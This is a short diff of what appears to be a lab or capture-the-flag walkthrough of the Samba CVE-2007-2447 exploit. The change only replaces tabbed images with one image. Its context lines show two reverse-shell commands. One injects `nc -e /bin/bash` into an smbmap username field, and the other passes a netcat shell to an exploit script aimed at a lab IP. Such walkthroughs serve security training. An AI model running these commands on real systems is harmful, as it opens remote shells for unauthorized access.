@@ -233,13 +233,7 @@ smbmap -u '/=`nc -e /bin/bash 10.10.14.4 4444`' -H 10.10.10.3
 python3 samba_rce_CVE-2007-2447.py 10.10.10.3 'nc -nv 10.10.14.5 443 -e /bin/sh'
 ```
 
-=== "smb command"
-
-	![](images/5.png)
-
-=== "samba_rce_CVE-2007-2447.py"
-
-	![](images/6.png)
+![](images/5.png)
 
 ### CVE-2004-2687
 
